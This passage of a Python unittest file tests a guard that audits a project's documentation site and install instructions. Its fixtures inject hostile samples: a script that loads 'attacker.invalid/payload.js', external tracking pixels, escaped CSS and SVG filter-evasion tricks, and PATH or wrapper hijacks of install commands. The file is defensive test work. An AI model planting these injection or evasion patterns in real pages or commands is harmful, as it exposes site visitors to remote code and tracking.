from __future__ import annotations

import shlex
import shutil
import tempfile
import unittest
from pathlib import Path

from scripts.docs_site_guard import (
    REPO_ROOT,
    SITE_ROOT,
    NESTED_SHELL_MAX_DEPTH,
    RELEASE_SCOPE_DOCS,
    STABLE_INSTALL_DOCS,
    STABLE_RELEASE_CONTRACTS,
    SOURCE_CANDIDATE_NOT_INSTALLABLE_MARKER,
    SOURCE_CANDIDATE_REQUIRED_COMMANDS,
    _stable_command_errors,
    audit_site,
    release_scope_markers,
    site_release_lens,
)


class DocumentationSiteGuardTests(unittest.TestCase):
    def test_stable_2_1_contract_keeps_the_legacy_wizard_gate_separate_from_source(self) -> None:
        contract = STABLE_RELEASE_CONTRACTS["2.1.0"]

        self.assertIn("pipx install ai-dememory==2.1.0", contract["required"])
        self.assertIn(
            "ai-dememory init ~/code/my-memory --wizard --require-version 2.1.0",
            contract["required"],
        )
        self.assertIn(
            "ai-dememory --root ~/code/my-memory mcp-config --client codex",
            contract["required"],
        )
        self.assertIn(
            "ai-dememory init ~/code/my-memory --wizard",
            contract["source_only"],
        )

    def test_release_scope_supports_source_equal_to_stable(self) -> None:
        self.assertEqual(
            release_scope_markers("2.1.0", "2.1.0"),
            ("published stable 2.1.0",),
        )
        self.assertEqual(site_release_lens("2.1.0", "2.1.0"), "Source/release line: 2.1.0")

    def test_release_scope_distinguishes_the_unpublished_patch_candidate(self) -> None:
        self.assertEqual(
            release_scope_markers("2.1.0", "2.1.1rc1"),
            ("published stable 2.1.0", "source candidate 2.1.1rc1 is unreleased"),
        )
        self.assertEqual(
            site_release_lens("2.1.0", "2.1.1rc1"),
            "Source candidate: 2.1.1rc1, unreleased",
        )

    def test_stable_user_docs_pin_the_legacy_artifact_and_keep_candidate_scope_explicit(self) -> None:
        for relative in STABLE_INSTALL_DOCS:
            with self.subTest(path=relative):
                text = (REPO_ROOT / relative).read_text(encoding="utf-8")
                self.assertEqual([], _stable_command_errors(text, "2.1.0", relative))

        for relative in RELEASE_SCOPE_DOCS:
            with self.subTest(scope_path=relative):
                text = (REPO_ROOT / relative).read_text(encoding="utf-8").lower()
                self.assertIn("published stable 2.1.0", text)
                self.assertIn("source candidate 2.1.1rc1 is unreleased", text)

        install = (REPO_ROOT / "docs/install.md").read_text(encoding="utf-8")
        self.assertIn(SOURCE_CANDIDATE_NOT_INSTALLABLE_MARKER, install)
        for command in SOURCE_CANDIDATE_REQUIRED_COMMANDS:
            self.assertIn(command, install)

    def test_checked_in_site_passes_guard(self) -> None:
        self.assertEqual([], audit_site())

    def test_guard_rejects_broken_local_link(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    'href="architecture/"', 'href="missing/"', 1
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("broken local reference 'missing/'" in error for error in errors))

    def test_guard_rejects_automatic_external_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</head>", '<script src="https://example.com/tracker.js"></script></head>', 1
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("automatic external resource is forbidden" in error for error in errors))

    def test_guard_rejects_iframe_srcdoc(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<iframe title="unsafe" srcdoc="&lt;script&gt;void 0&lt;/script&gt;"></iframe>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("iframe srcdoc is forbidden" in error for error in errors))

    def test_guard_rejects_inline_event_handler_attributes(self) -> None:
        attributes = (
            'onload="alert(1)"',
            'oNlOaD="alert(1)"',
            "onload",
            'onload="" ONLOAD=""',
        )
        for attribute_text in attributes:
            with self.subTest(attributes=attribute_text), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>",
                        f'<img src="assets/favicon.svg" alt="" {attribute_text}>\n</main>',
                        1,
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any(
                        "inline HTML event handler attribute 'onload' is forbidden" in error
                        for error in errors
                    )
                )

    def test_guard_rejects_static_interactive_controls_with_command_values(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<input value="ai-dememory mcp-config --client codex">\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("static interactive <input> controls are forbidden" in error for error in errors)
            )

    def test_guard_rejects_ping_attributes(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<a href="./" ping="/receipt">Unsafe receipt</a>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("HTML ping attribute is forbidden" in error for error in errors)
            )

    def test_guard_allows_data_attributes_on_local_resources(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<img src="assets/favicon.svg" alt="" data-onload="" data-action="copy">\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_external_srcset_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<img src="assets/favicon.svg" srcset="https://example.com/leak.png 2x" alt="">\n</main>',
                    1,
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("automatic external resource is forbidden" in error for error in errors))

    def test_guard_rejects_extended_automatic_resource_attributes(self) -> None:
        fixtures = (
            (
                "<body>",
                '<body background="https://example.com/pixel.png">',
            ),
            (
                "</head>",
                '<link rel="preload" as="image" imagesrcset="https://example.com/leak.png 2x"></head>',
            ),
            (
                "</main>",
                '<img src="assets/favicon.svg" lowsrc="https://example.com/legacy.png" alt="">\n</main>',
            ),
            (
                "</main>",
                '<svg><feImage href="https://example.com/leak.svg"></feImage></svg>\n</main>',
            ),
        )
        for needle, replacement in fixtures:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(needle, replacement, 1),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("automatic external resource is forbidden" in error for error in errors)
                )

    def test_guard_allows_local_extended_automatic_resources(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8")
                .replace("<body>", '<body background="assets/favicon.svg">', 1)
                .replace(
                    "</head>",
                    '<link rel="preload" as="image" href="assets/favicon.svg" imagesrcset="assets/favicon.svg 1x"></head>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_external_svg_href_resources(self) -> None:
        for element in ("image", "pattern", "use"):
            with self.subTest(element=element), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>",
                        f'<svg><{element} href="https://github.com/external.svg"></{element}></svg>\n</main>',
                        1,
                    ),
                    encoding="utf-8",
                )
                errors = audit_site(REPO_ROOT, copied)
                self.assertTrue(any("automatic external resource is forbidden" in error for error in errors))

    def test_guard_rejects_svg_url_presentation_resources(self) -> None:
        fixtures = (
            '<svg><rect fill="url(https://example.com/pixel.svg)"></rect></svg>',
            '<svg><rect filter="u\\72l(https://example.com/filter.svg)"></rect></svg>',
        )
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>", f"{fixture}\n</main>", 1
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("SVG URL-bearing presentation attribute" in error for error in errors)
                )

    def test_guard_rejects_svg_dynamic_elements(self) -> None:
        fixtures = (
            '<svg><set attributeName="href" to="https://example.com/pixel.svg"></set></svg>',
            '<svg><animate attributeName="href" to="https://example.com/pixel.svg"></animate></svg>',
            '<svg><animateMotion path="M0,0"></animateMotion></svg>',
            '<svg><svg:animate attributeName="href" to="https://example.com/pixel.svg"></svg:animate></svg>',
            '<svg><a:set attributeName="href" to="https://example.com/pixel.svg"></a:set></svg>',
            '<svg><é:set attributeName="href" to="https://example.com/pixel.svg"></é:set></svg>',
            '<svg:svg><a:set attributeName="href" to="https://example.com/pixel.svg"></a:set></svg:svg>',
        )
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace("</main>", f"{fixture}\n</main>", 1),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(any("SVG dynamic" in error for error in errors))

    def test_guard_allows_static_svg_without_resource_reference(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<svg viewBox="0 0 1 1"><rect fill="currentColor"></rect></svg>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_allows_local_svg_presentation_fragment(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    "<svg><defs><marker id=\"local-marker\"></marker></defs>"
                    '<path marker-end="url(#local-marker)"></path></svg>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_unallowlisted_local_active_assets(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            (copied / "assets" / "unreviewed.js").write_text("void 0;\n", encoding="utf-8")
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</head>", '<script src="assets/unreviewed.js"></script></head>', 1
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("local active asset is not allowlisted" in error for error in errors))

    def test_guard_rejects_module_script_type(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</head>",
                    '<script type="module" src="assets/site.js"></script></head>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("module scripts are forbidden" in error for error in errors))

    def test_guard_rejects_any_unreviewed_site_javascript_change(self) -> None:
        changes = (
            (
                "computed property and constructed external script",
                "const script = document[\"create\" + \"Element\"](\"script\");\n"
                "script.src = \"https:\" + \"//attacker.invalid/payload.js\";\n"
                "document.body[\"append\"](script);\n",
            ),
            ("benign content drift", 'const important = "copy";\n'),
        )
        for label, change in changes:
            with self.subTest(change=label), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                javascript = copied / "assets" / "site.js"
                javascript.write_text(
                    change + javascript.read_text(encoding="utf-8"),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("assets/site.js: content does not match the approved reviewed fingerprint" in error for error in errors)
                )

    def test_guard_rejects_dynamic_active_asset_primitives(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            javascript = copied / "assets" / "site.js"
            javascript.write_text(
                'document.createElement("script");\n' + javascript.read_text(encoding="utf-8"),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("assets/site.js: content does not match the approved reviewed fingerprint" in error for error in errors)
            )

    def test_guard_audits_allowlisted_svg_assets(self) -> None:
        payloads = (
            "<script>void 0</script>",
            '<set attributeName="href" to="https://example.com/pixel.svg"></set>',
            '<svg:animate attributeName="href" to="https://example.com/pixel.svg"></svg:animate>',
            '<a:set attributeName="href" to="https://example.com/pixel.svg"></a:set>',
            '<é:set attributeName="href" to="https://example.com/pixel.svg"></é:set>',
            '<style>@import "unreviewed.css";</style>',
            '<style>@im\\70ort "unreviewed.css";</style>',
            '<style>.probe { background-image: u\\72l("unreviewed.svg"); }</style>',
        )
        for payload in payloads:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                favicon = copied / "assets" / "favicon.svg"
                favicon.write_text(
                    favicon.read_text(encoding="utf-8").replace(
                        "</svg>", f"{payload}</svg>", 1
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("assets/favicon.svg: active SVG content or references are forbidden" in error for error in errors)
                )

    def test_guard_rejects_inline_css_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "<body>",
                    '<body style="background-image: url(https://example.com/pixel.png)">',
                    1,
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("inline CSS imports/resources are forbidden" in error for error in errors))

    def test_guard_rejects_escaped_inline_css_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "<body>",
                    '<body style="background-image: u\\72l(https://example.com/pixel.png)">',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("inline CSS imports/resources are forbidden" in error for error in errors))

    def test_guard_rejects_escaped_css_resource_tokens(self) -> None:
        payloads = (
            '@im\\70ort "https://example.com/tracker.css";',
            '.probe { background-image: u\\72l("https://example.com/pixel.png"); }',
            '.probe { background-image: image-set("https://example.com/pixel.png" 1x); }',
            '.probe { background-image: image("https://example.com/pixel.png"); }',
        )
        for payload in payloads:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                stylesheet = copied / "assets" / "site.css"
                stylesheet.write_text(
                    stylesheet.read_text(encoding="utf-8") + f"\n{payload}\n",
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("assets/site.css: resource imports or references are forbidden" in error for error in errors)
                )

    def test_guard_allows_css_background_without_resource_url(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            stylesheet = copied / "assets" / "site.css"
            stylesheet.write_text(
                stylesheet.read_text(encoding="utf-8") + "\n.probe { background: var(--paper); }\n",
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_missing_legacy_and_candidate_wizard_commands(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            for page in copied.rglob("*.html"):
                page.write_text(
                    page.read_text(encoding="utf-8").replace(
                        "ai-dememory init ~/code/my-memory --wizard",
                        "ai-dememory init ~/code/my-memory",
                    ),
                    encoding="utf-8",
                )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(
                any(
                    "stable 2.1.0 command block is missing "
                    "'ai-dememory init ~/code/my-memory --wizard --require-version 2.1.0'"
                    in error
                    for error in errors
                )
            )
            self.assertTrue(
                any(
                    "source 2.1.1rc1 command block is missing "
                    "'ai-dememory init ~/code/my-memory --wizard'" in error
                    for error in errors
                )
            )

    def test_guard_rejects_mutable_vcs_install_in_stable_block(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "pipx install ai-dememory",
                    "pipx install git+https://github.com/GonzaloTorreras/ai-dememory.git",
                    1,
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(
                any("stable package command is not allowlisted" in error for error in errors)
            )

    def test_guard_rejects_mutable_vcs_install_in_any_stable_doc(self) -> None:
        errors = _stable_command_errors(
            "pipx install git+https://github.com/GonzaloTorreras/ai-dememory.git",
            "2.1.0",
            "fixture",
        )
        self.assertTrue(any("not allowlisted" in error for error in errors))

    def test_guard_rejects_unpinned_install_in_stable_block(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "pipx install ai-dememory==2.1.0",
                    "pipx install ai-dememory",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("not allowlisted" in error for error in errors))

    def test_guard_validates_visible_commands_outside_release_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    "<pre>ai-dememory mcp --stdio</pre>\n</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "site/index.html" in error and "direct MCP server" in error
                    for error in errors
                )
            )

    def test_guard_validates_commands_in_user_reachable_html_states(self) -> None:
        unsafe_command = "ai-dememory mcp --stdio"
        forms = (
            f'<div aria-hidden="true"><pre>{unsafe_command}</pre></div>',
            f"<details><summary>More</summary><pre>{unsafe_command}</pre></details>",
            (
                '<button popovertarget="qa-popover">Show</button>'
                f'<div id="qa-popover" popover><pre>{unsafe_command}</pre></div>'
            ),
            f"<noscript><pre>{unsafe_command}</pre></noscript>",
        )
        for markup in forms:
            with self.subTest(markup=markup), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>", f"{markup}\n</main>", 1
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any(
                        "site/index.html" in error and "direct MCP server" in error
                        for error in errors
                    )
                )

    def test_guard_rejects_release_markers_on_hidden_content(self) -> None:
        hidden_forms = (
            'data-release="stable-2.1.0" hidden',
            'data-release="stable-2.1.0" aria-hidden="true"',
            'data-release="stable-2.1.0" style="display: none"',
            'data-release="stable-2.1.0" style="visibility: hidden"',
        )
        for hidden_form in hidden_forms:
            with self.subTest(hidden_form=hidden_form), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        'data-release="stable-2.1.0"',
                        hidden_form,
                        1,
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(any("non-rendered content" in error for error in errors))

    def test_guard_rejects_release_markers_inside_templates(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    '<div class="code-block" data-copy-block data-release="stable-2.1.0">',
                    '<template><div class="code-block" data-copy-block data-release="stable-2.1.0">',
                    1,
                ).replace("</main>", "</template>\n</main>", 1),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("non-rendered content" in error for error in errors))

    def test_guard_rejects_ambiguous_or_noncanonical_release_markup(self) -> None:
        canonical = '<div class="code-block" data-copy-block data-release="stable-2.1.0">'
        mutations = (
            '<div class="code-block visually-hidden" data-copy-block data-release="stable-2.1.0">',
            '<div style="display:none" style="" class="code-block" data-copy-block data-release="stable-2.1.0">',
            '<dialog><div class="code-block" data-copy-block data-release="stable-2.1.0">',
            '<datalist><div class="code-block" data-copy-block data-release="stable-2.1.0">',
            '<span hidden/></span><div class="code-block" data-copy-block data-release="stable-2.1.0">',
            '<div hidden></span><div class="code-block" data-copy-block data-release="stable-2.1.0">',
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(canonical, mutation, 1),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any(
                        marker in error
                        for error in errors
                        for marker in (
                            "canonical visible code-block",
                            "non-rendered content",
                            "duplicate HTML attribute",
                            "mismatched closing tag",
                            "self-closing syntax",
                        )
                    )
                )

    def test_guard_rejects_non_exact_package_variants(self) -> None:
        commands = (
            "pipx install ai-dememory==2.1.0rc1",
            "pipx install ai-dememory==2.1.0.post1",
            "pipx install --force ai-dememory",
            "pipx reinstall ai-dememory",
            "pipx upgrade ai-dememory",
            "uv tool install ai-dememory",
            "python3 -m pip install --upgrade ai-dememory",
            "pipx install --index-url https://pypi.org/simple ai-dememory",
            "pipx install --pip-args=--pre ai-dememory",
            "python3 -m pip install --extra-index-url https://example.test/simple ai-dememory==2.1.0",
            "pipx install ai-dememory==2.1.0 --index-url https://example.test/simple",
            "pipx install --force ai-dememory==2.1.0 --pip-args=--pre",
            "pipx install AI-DeMemory==2.1.0rc1",
            "python3 -m pip install ai_dememory==2.1.0rc1",
            "pip install ai-dememory",
            "pip3 install ai-dememory",
            "uv pip install ai-dememory",
            "python.exe -m pip install ai-dememory",
            "py -3.12 -m pip install ai-dememory",
            "pipx.exe install ai-dememory",
            "C:\\Tools\\pipx.exe install ai-dememory==2.1.0rc1",
            "C:/Tools/uv.exe tool install ai-dememory",
            "/usr/local/bin/uv tool install ai-dememory",
            "/usr/bin/python3 -m pip install ai-dememory",
            "python -m pip --isolated install ai-dememory",
            "python -m pip -q install ai-dememory",
            "pip --isolated install ai-dememory",
            "pip -q install ai-dememory",
            "pipx --global install ai-dememory",
            "pipx --verbose install ai-dememory",
            "uv --offline tool install ai-dememory",
            "python -m pipx --global install ai-dememory",
            "python -m uv --offline tool install ai-dememory",
            "py -3.12 -m uv --offline tool install ai-dememory",
            "pipx install ai-'dememory'",
            "custom-wrapper pipx install ai-'dememory'",
            "custom-wrapper pipx install ai-$'dememory'",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(
                    f"{command}\nai-dememory version-check 2.1.0\n",
                    "2.1.0",
                    "fixture",
                )
                self.assertTrue(
                    any(
                        "not allowlisted" in error or "literal shell syntax" in error
                        for error in errors
                    )
                )

    def test_guard_does_not_count_echo_or_comment_as_release_commands(self) -> None:
        for prefix in ("echo ", "# "):
            with self.subTest(prefix=prefix), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                for page in copied.rglob("*.html"):
                    page.write_text(
                        page.read_text(encoding="utf-8").replace(
                            "pipx install ai-dememory==2.1.0",
                            f"{prefix}pipx install ai-dememory==2.1.0",
                        ),
                        encoding="utf-8",
                    )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(any("command block is missing 'pipx install ai-dememory==2.1.0'" in error for error in errors))

    def test_guard_rejects_corruption_of_one_site_entrypoint(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "pipx install ai-dememory==2.1.0",
                    "echo pipx install ai-dememory==2.1.0",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "site/index.html: required executable stable command is missing"
                    in error
                    for error in errors
                )
            )

    def test_guard_allows_mcp_config_without_runtime_version_gate(self) -> None:
        for command in (
            "ai-dememory mcp-config --client codex",
            "ai-dememory mcp-config --client codex --require-version 2.1.0rc1",
            'ai-dememory --root "/tmp/My Vault" mcp-config --client codex',
        ):
            with self.subTest(command=command):
                self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

        for command in (
            "ai-dememory mcp-config --client codex; echo reviewed",
            "ai-dememory mcp-config --client codex && echo reviewed",
            "ai-dememory mcp-config --client codex | Out-File config.toml",
        ):
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("shell chaining or redirection" in error for error in errors))

    def test_guard_rejects_shell_whitespace_wrappers_and_hidden_continuations(self) -> None:
        fixtures = {
            "vertical-tab": "ai-dememory\vmcp-config --client codex",
            "form-feed": "ai-dememory\fmcp-config --client codex",
            "no-break-space": "ai-dememory\u00a0mcp-config --client codex",
            "figure-space": "ai-dememory\u2007mcp-config --client codex",
            "narrow-no-break-space": "ai-dememory\u202fmcp-config --client codex",
            "powershell-call": "& ai-dememory mcp-config --client codex",
            "bash-package-continuation": (
                "pipx install \\\n  ai-dememory\nai-dememory version-check 2.1.0"
            ),
        }
        for label, command in fixtures.items():
            with self.subTest(label=label):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(errors)
                self.assertTrue(
                    any(
                        marker in error
                        for error in errors
                        for marker in (
                            "unsupported shell whitespace",
                            "PowerShell call operator",
                            "not allowlisted",
                            "shell chaining or redirection",
                        )
                    )
                )

    def test_guard_normalizes_powershell_unicode_quote_delimiters(self) -> None:
        for opening, closing in (
            ("\u2018", "\u2019"),
            ("\u201a", "\u201b"),
            ("\u201c", "\u201d"),
        ):
            command = (
                f"& {opening}C:\\Tools\\pipx.exe{closing} "
                "install ai-dememory"
            )
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("PowerShell call operator" in error for error in errors))
                self.assertTrue(any("not allowlisted" in error for error in errors))

    def test_guard_recognizes_forward_compatible_versioned_python_paths(self) -> None:
        command = (
            "C:\\Tools\\python3.14.exe -m ai_dememory_tool mcp --stdio "
            "--require-bound-root --require-version 2.1.0"
        )
        errors = _stable_command_errors(command, "2.1.0", "fixture")
        self.assertTrue(any("internal Python CLI API" in error for error in errors))

    def test_guard_rejects_wrapped_or_chained_mcp_commands(self) -> None:
        fixtures = (
            "cd ~/vault && ai-dememory mcp-config --client codex",
            "ai-dememory doctor && ai-dememory mcp-config --client codex",
            '& "ai-dememory" mcp-config --client codex --require-version 2.1.0',
            "echo ok && ai-dememory mcp-config --client codex --require-version 2.1.0",
            "sudo ai-dememory mcp-config --client codex --require-version 2.1.0",
            "command ai-dememory mcp-config --client codex --require-version 2.1.0",
            "env X=1 ai-dememory mcp-config --client codex --require-version 2.1.0",
            "PATH=/tmp/evil ai-dememory --root /good mcp-config --client codex --require-version 2.1.0",
            "env PATH=/tmp/evil ai-dememory --root /good mcp-config --client codex --require-version 2.1.0",
            "cmd /c ai-dememory mcp-config --client codex --require-version 2.1.0",
            'pwsh -Command "ai-dememory mcp-config --client codex --require-version 2.1.0"',
            "custom-wrapper ai-dememory mcp-config --client codex --require-version 2.1.0",
            'custom-wrapper ai-dememory mcp-"config" --client codex --require-version 2.1.0',
            "python /tmp/evil/ai_dememory.py --root /good mcp-config --client codex --require-version 2.1.0",
            "python 'C:\\evil\\ai_dememory.py' --root C:/good mcp-config --client codex --require-version 2.1.0",
            'custom-wrapper ai-"dememory" mcp-config --client codex --require-version 2.1.0',
            "custom-wrapper ai-dememory mcp-$'config' --client codex --require-version 2.1.0",
            "$CLI mcp-config --client codex --require-version 2.1.0",
            (
